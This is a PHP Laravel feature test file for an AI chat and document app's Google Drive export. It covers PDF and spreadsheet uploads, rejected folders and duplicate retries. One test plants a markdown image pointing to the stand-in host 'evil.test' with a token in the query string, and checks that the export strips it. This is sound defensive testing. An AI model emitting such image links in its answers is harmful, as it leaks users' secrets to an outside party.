<?php

namespace Tests\Feature\CloudStorage;

use App\Livewire\Chat\ChatIndex;
use App\Livewire\Documents\DocumentViewer;
use App\Models\CloudStorageFile;
use App\Models\Conversation;
use App\Models\Document;
use App\Models\Message;
use App\Models\User;
use App\Services\CloudStorage\GoogleDriveService;
use App\Services\DocumentExportService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Storage;
use Livewire\Livewire;
use Mockery;
use Tests\TestCase;

class GoogleDriveUploadTest extends TestCase
{
    use RefreshDatabase;

    public function test_chat_answer_can_upload_exported_file_to_google_drive(): void
    {
        Storage::fake('local');

        $user = User::factory()->create();
        $conversation = Conversation::create([
            'user_id' => $user->id,
            'title' => 'Drive answer upload',
        ]);
        $message = Message::create([
            'conversation_id' => $conversation->id,
            'role' => 'assistant',
            'content' => "Ini jawaban untuk Drive.\n\n- Satu\n- Dua",
        ]);

        $exportService = Mockery::mock(DocumentExportService::class);
        $exportService->shouldReceive('exportContent')
            ->once()
            ->with(Mockery::on(fn (string $html): bool => str_contains($html, 'Ini jawaban untuk Drive')), 'pdf', 'ista-ai-jawaban-'.$message->id)
            ->andReturn([
                'body' => '%PDF-1.4 chat answer',
                'content_type' => 'application/pdf',
                'file_name' => 'ista-ai-jawaban-'.$message->id.'.pdf',
            ]);

        $this->app->instance(DocumentExportService::class, $exportService);

        $googleDriveService = Mockery::mock(GoogleDriveService::class);
        $googleDriveService->shouldReceive('canUploadWithConfiguredAccount')
            ->byDefault()
            ->andReturn(true);
        $googleDriveService->shouldReceive('uploadFromPath')
            ->once()
            ->with(Mockery::on(function (string $path): bool {
                return is_file($path) && file_get_contents($path) === '%PDF-1.4 chat answer';
            }), 'ista-ai-jawaban-'.$message->id.'.pdf', 'application/pdf', null)
            ->andReturn([
                'external_id' => 'drive-answer-id',
                'name' => 'ista-ai-jawaban-'.$message->id.'.pdf',
                'mime_type' => 'application/pdf',
                'web_view_link' => 'https://drive.google.com/file/d/drive-answer-id/view',
                'folder_external_id' => 'folder-upload-id',
                'size_bytes' => 2048,
            ]);

        $this->app->instance(GoogleDriveService::class, $googleDriveService);

        Livewire::actingAs($user)
            ->test(ChatIndex::class)
            ->call('saveAnswerToGoogleDrive', $message->id, 'pdf');

        $this->assertDatabaseHas('cloud_storage_files', [
            'user_id' => $user->id,
            'provider' => 'google_drive',
            'direction' => CloudStorageFile::DIRECTION_EXPORT,
            'local_type' => Message::class,
            'local_id' => $message->id,
            'external_id' => 'drive-answer-id',
            'name' => 'ista-ai-jawaban-'.$message->id.'.pdf',
            'mime_type' => 'application/pdf',
            'folder_external_id' => 'folder-upload-id',
        ]);
    }

    public function test_chat_answer_upload_strips_markdown_images_before_export(): void
    {
        Storage::fake('local');

        $user = User::factory()->create();
        $conversation = Conversation::create([
            'user_id' => $user->id,
            'title' => 'Drive answer upload',
        ]);
        $message = Message::create([
            'conversation_id' => $conversation->id,
            'role' => 'assistant',
            'content' => 'Aman ![secret](https://evil.test/leak.png?data=token) dan [tautan](https://example.com).',
        ]);

        $exportService = Mockery::mock(DocumentExportService::class);
        $exportService->shouldReceive('exportContent')
            ->once()
            ->with(Mockery::on(function (string $html): bool {
                return str_contains($html, 'Aman')
                    && str_contains($html, '<a href="https://example.com">tautan</a>')
                    && ! str_contains($html, '<img')
                    && ! str_contains($html, 'https://evil.test');
            }), 'pdf', 'ista-ai-jawaban-'.$message->id)
            ->andReturn([
                'body' => '%PDF-1.4 sanitized chat answer',
                'content_type' => 'application/pdf',
                'file_name' => 'ista-ai-jawaban-'.$message->id.'.pdf',
            ]);

        $this->app->instance(DocumentExportService::class, $exportService);

        $googleDriveService = Mockery::mock(GoogleDriveService::class);
        $googleDriveService->shouldReceive('canUploadWithConfiguredAccount')
            ->byDefault()
            ->andReturn(true);
        $googleDriveService->shouldReceive('uploadFromPath')
            ->once()
            ->with(Mockery::on(function (string $path): bool {
                return is_file($path) && file_get_contents($path) === '%PDF-1.4 sanitized chat answer';
            }), 'ista-ai-jawaban-'.$message->id.'.pdf', 'application/pdf', null)
            ->andReturn([
                'external_id' => 'drive-sanitized-answer-id',
                'name' => 'ista-ai-jawaban-'.$message->id.'.pdf',
                'mime_type' => 'application/pdf',
                'web_view_link' => 'https://drive.google.com/file/d/drive-sanitized-answer-id/view',
                'folder_external_id' => 'folder-upload-id',
                'size_bytes' => 2048,
            ]);

        $this->app->instance(GoogleDriveService::class, $googleDriveService);

        Livewire::actingAs($user)
            ->test(ChatIndex::class)
            ->call('saveAnswerToGoogleDrive', $message->id, 'pdf');

        $this->assertDatabaseHas('cloud_storage_files', [
            'user_id' => $user->id,
            'provider' => 'google_drive',
            'direction' => CloudStorageFile::DIRECTION_EXPORT,
            'local_type' => Message::class,
            'local_id' => $message->id,
            'external_id' => 'drive-sanitized-answer-id',
        ]);
    }

    public function test_chat_answer_spreadsheet_upload_requires_table_content(): void
    {
        $user = User::factory()->create();
        $conversation = Conversation::create([
            'user_id' => $user->id,
            'title' => 'Drive answer upload',
        ]);
        $message = Message::create([
            'conversation_id' => $conversation->id,
            'role' => 'assistant',
            'content' => "Ini jawaban naratif tanpa tabel.\n\n- Satu\n- Dua",
        ]);

        $exportService = Mockery::mock(DocumentExportService::class);
        $exportService->shouldNotReceive('exportContent');
        $this->app->instance(DocumentExportService::class, $exportService);

        Livewire::actingAs($user)
            ->test(ChatIndex::class)
            ->call('saveAnswerToGoogleDrive', $message->id, 'xlsx')
            ->assertReturned([
                'ok' => false,
                'message' => 'Format spreadsheet hanya tersedia untuk jawaban AI yang berisi tabel.',
            ]);

        $this->assertDatabaseCount('cloud_storage_files', 0);
    }

    public function test_document_viewer_can_upload_exported_file_to_google_drive(): void
    {
        Storage::fake('local');

        $user = User::factory()->create();
        $document = $this->createDocument($user);

        $exportService = Mockery::mock(DocumentExportService::class);
        $exportService->shouldReceive('exportDocument')
            ->once()
            ->with(Mockery::on(fn (Document $value) => $value->is($document)), 'pdf', 'surat-keluar')
            ->andReturn([
                'body' => '%PDF-1.4 exported',
                'content_type' => 'application/pdf',
                'file_name' => 'surat-keluar.pdf',
            ]);

        $this->app->instance(DocumentExportService::class, $exportService);

        $googleDriveService = Mockery::mock(GoogleDriveService::class);
        $googleDriveService->shouldReceive('canUploadWithConfiguredAccount')
            ->byDefault()
            ->andReturn(true);
        $googleDriveService->shouldReceive('uploadFromPath')
            ->once()
            ->with(Mockery::on(function (string $path): bool {
                return is_file($path) && file_get_contents($path) === '%PDF-1.4 exported';
            }), 'surat-keluar.pdf', 'application/pdf', null)
            ->andReturn([
                'external_id' => 'drive-upload-id',
                'name' => 'surat-keluar.pdf',
                'mime_type' => 'application/pdf',
                'web_view_link' => 'https://drive.google.com/file/d/drive-upload-id/view',
                'folder_external_id' => 'folder-upload-id',
                'size_bytes' => 4096,
            ]);

        $this->app->instance(GoogleDriveService::class, $googleDriveService);

        Livewire::actingAs($user)
            ->test(DocumentViewer::class)
            ->call('open', $document->id)
            ->call('saveToGoogleDrive', 'pdf')
            ->assertSee('Tersimpan ke Google Drive', false)
            ->assertSee('Buka di Drive', false);

        $this->assertDatabaseHas('cloud_storage_files', [
            'user_id' => $user->id,
            'provider' => 'google_drive',
            'direction' => CloudStorageFile::DIRECTION_EXPORT,
            'local_type' => Document::class,
            'local_id' => $document->id,
            'external_id' => 'drive-upload-id',
            'name' => 'surat-keluar.pdf',
            'mime_type' => 'application/pdf',
            'folder_external_id' => 'folder-upload-id',
        ]);
    }

    public function test_document_viewer_can_upload_spreadsheet_export_with_real_table_payload_to_google_drive(): void
    {
        Storage::fake('local');
        config([
            'services.ai_document_service.url' => 'http://document-service.test',
            'services.ai_document_service.token' => 'document-token',
        ]);

        $user = User::factory()->create();
        $document = $this->createDocument($user);

        Storage::disk('local')->put($document->file_path, '%PDF-1.4 fake table document');

        Http::fake(function ($request) {
            if ($request->url() === 'http://document-service.test/api/documents/extract-tables') {
                return Http::response([
                    'status' => 'success',
                    'filename' => 'surat-keluar.pdf',
                    'tables' => [
                        [
                            'header' => ['Nama', 'Nilai'],
                            'rows' => [
                                ['A', '10'],
                            ],
                        ],
                    ],
                ]);
            }

            if ($request->url() === 'http://document-service.test/api/documents/export') {
                return Http::response('xlsx artifact');
            }

            return Http::response('', 404);
        });

        $googleDriveService = Mockery::mock(GoogleDriveService::class);
        $googleDriveService->shouldReceive('canUploadWithConfiguredAccount')
            ->byDefault()
            ->andReturn(true);
        $googleDriveService->shouldReceive('uploadFromPath')
            ->once()
            ->with(Mockery::on(function (string $path): bool {
                return is_file($path) && file_get_contents($path) === 'xlsx artifact';
            }), 'surat-keluar.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', null)
            ->andReturn([
                'external_id' => 'drive-upload-xlsx-id',
                'name' => 'surat-keluar.xlsx',
                'mime_type' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                'web_view_link' => 'https://drive.google.com/file/d/drive-upload-xlsx-id/view',
                'folder_external_id' => 'folder-upload-id',
                'size_bytes' => 2048,
            ]);

        $this->app->instance(GoogleDriveService::class, $googleDriveService);

        Livewire::actingAs($user)
            ->test(DocumentViewer::class)
            ->call('open', $document->id)
            ->call('saveToGoogleDrive', 'xlsx')
            ->assertSee('Tersimpan ke Google Drive', false);

        Http::assertSent(fn ($request): bool => $request->url() === 'http://document-service.test/api/documents/export'
            && $request['target_format'] === 'xlsx'
            && str_contains((string) $request['content_html'], 'Nama')
            && str_contains((string) $request['content_html'], 'A')
            && str_contains((string) $request['content_html'], '10'));

        $this->assertDatabaseHas('cloud_storage_files', [
            'user_id' => $user->id,
            'provider' => 'google_drive',
            'direction' => CloudStorageFile::DIRECTION_EXPORT,
            'local_type' => Document::class,
            'local_id' => $document->id,
            'external_id' => 'drive-upload-xlsx-id',
            'name' => 'surat-keluar.xlsx',
            'mime_type' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            'folder_external_id' => 'folder-upload-id',
        ]);
    }

    public function test_document_viewer_shows_error_when_upload_target_folder_is_rejected(): void
    {
        Storage::fake('local');

        $user = User::factory()->create();
        $document = $this->createDocument($user);

        $exportService = Mockery::mock(DocumentExportService::class);
        $exportService->shouldReceive('exportDocument')
            ->once()
            ->with(Mockery::on(fn (Document $value) => $value->is($document)), 'pdf', 'surat-keluar')
            ->andReturn([
                'body' => '%PDF-1.4 exported',
                'content_type' => 'application/pdf',
                'file_name' => 'surat-keluar.pdf',
            ]);

        $this->app->instance(DocumentExportService::class, $exportService);

        $googleDriveService = Mockery::mock(GoogleDriveService::class);
        $googleDriveService->shouldReceive('canUploadWithConfiguredAccount')
            ->byDefault()
            ->andReturn(true);
        $googleDriveService->shouldReceive('uploadFromPath')
            ->once()
            ->with(Mockery::type('string'), 'surat-keluar.pdf', 'application/pdf', 'outside-folder-id')
            ->andThrow(new \RuntimeException('Folder Google Drive berada di luar folder kantor yang diizinkan.'));

        $this->app->instance(GoogleDriveService::class, $googleDriveService);

        Livewire::actingAs($user)
            ->test(DocumentViewer::class)
            ->call('open', $document->id)
            ->call('saveToGoogleDrive', 'pdf', 'outside-folder-id')
            ->assertSee('Folder Google Drive berada di luar folder kantor yang diizinkan.', false);

        $this->assertDatabaseCount('cloud_storage_files', 0);
    }

    private function createDocument(User $user): Document
    {
        return Document::create([
            'user_id' => $user->id,
            'filename' => 'surat-keluar.pdf',
            'original_name' => 'surat-keluar.pdf',
            'file_path' => 'documents/'.$user->id.'/surat-keluar.pdf',
            'source_provider' => 'local',
            'mime_type' => 'application/pdf',
            'file_size_bytes' => 1024,
            'status' => 'ready',
            'preview_status' => Document::PREVIEW_STATUS_READY,
        ]);
    }

    // -------------------------------------------------------------------------
    // Idempotency: retry / double-click does not create duplicate records
    // -------------------------------------------------------------------------

    public function test_chat_answer_export_is_idempotent_on_duplicate_external_id(): void
    {
        Storage::fake('local');

        $user = User::factory()->create();
        $conversation = Conversation::create(['user_id' => $user->id, 'title' => 'Idempotency test']);
        $message = Message::create([
            'conversation_id' => $conversation->id,
            'role' => 'assistant',
            'content' => 'Jawaban untuk uji idempotency.',
        ]);

        $exportService = Mockery::mock(DocumentExportService::class);
        $exportService->shouldReceive('exportContent')
            ->andReturn([
                'body' => '%PDF-1.4 idem',
                'content_type' => 'application/pdf',
                'file_name' => 'ista-ai-jawaban-'.$message->id.'.pdf',
            ]);
        $this->app->instance(DocumentExportService::class, $exportService);

        $uploadResult = [
            'external_id' => 'drive-idem-id',
            'name' => 'ista-ai-jawaban-'.$message->id.'.pdf',
            'mime_type' => 'application/pdf',
            'web_view_link' => 'https://drive.google.com/file/d/drive-idem-id/view',
            'folder_external_id' => 'folder-id',
            'size_bytes' => 512,
        ];

        $googleDriveService = Mockery::mock(GoogleDriveService::class);
        $googleDriveService->shouldReceive('canUploadWithConfiguredAccount')->andReturn(true);
        $googleDriveService->shouldReceive('uploadFromPath')->twice()->andReturn($uploadResult);
        $this->app->instance(GoogleDriveService::class, $googleDriveService);

        $component = Livewire::actingAs($user)->test(ChatIndex::class);

        // First export.
        $component->call('saveAnswerToGoogleDrive', $message->id, 'pdf');

        // Second export with the same external_id (retry / double-click).
        $component->call('saveAnswerToGoogleDrive', $message->id, 'pdf');

        // Must produce exactly ONE cloud_storage_files record, not two.
        $this->assertDatabaseCount('cloud_storage_files', 1);
        $this->assertDatabaseHas('cloud_storage_files', [
            'user_id' => $user->id,
            'provider' => 'google_drive',
            'external_id' => 'drive-idem-id',
        ]);
    }

    public function test_document_viewer_export_is_idempotent_on_duplicate_external_id(): void
    {
        Storage::fake('local');

        $user = User::factory()->create();
        $document = $this->createDocument($user);

        $exportService = Mockery::mock(DocumentExportService::class);
        $exportService->shouldReceive('exportDocument')
            ->andReturn([
                'body' => '%PDF-1.4 idem',
                'content_type' => 'application/pdf',
                'file_name' => 'surat-keluar.pdf',
            ]);
        $this->app->instance(DocumentExportService::class, $exportService);

        $uploadResult = [
            'external_id' => 'drive-doc-idem-id',
            'name' => 'surat-keluar.pdf',
            'mime_type' => 'application/pdf',
            'web_view_link' => 'https://drive.google.com/file/d/drive-doc-idem-id/view',
            'folder_external_id' => 'folder-id',
            'size_bytes' => 1024,
        ];

        $googleDriveService = Mockery::mock(GoogleDriveService::class);
        $googleDriveService->shouldReceive('canUploadWithConfiguredAccount')->andReturn(true);
        $googleDriveService->shouldReceive('uploadFromPath')->twice()->andReturn($uploadResult);
        $this->app->instance(GoogleDriveService::class, $googleDriveService);

        $component = Livewire::actingAs($user)->test(DocumentViewer::class)->call('open', $document->id);

        // First export.
        $component->call('saveToGoogleDrive', 'pdf');

        // Second export (retry) with the same Drive external_id.
        $component->call('saveToGoogleDrive', 'pdf');

        // Only one record should exist — no duplicates.
        $this->assertDatabaseCount('cloud_storage_files', 1);
        $this->assertDatabaseHas('cloud_storage_files', [
            'user_id' => $user->id,
            'provider' => 'google_drive',
            'external_id' => 'drive-doc-idem-id',
        ]);
    }
}
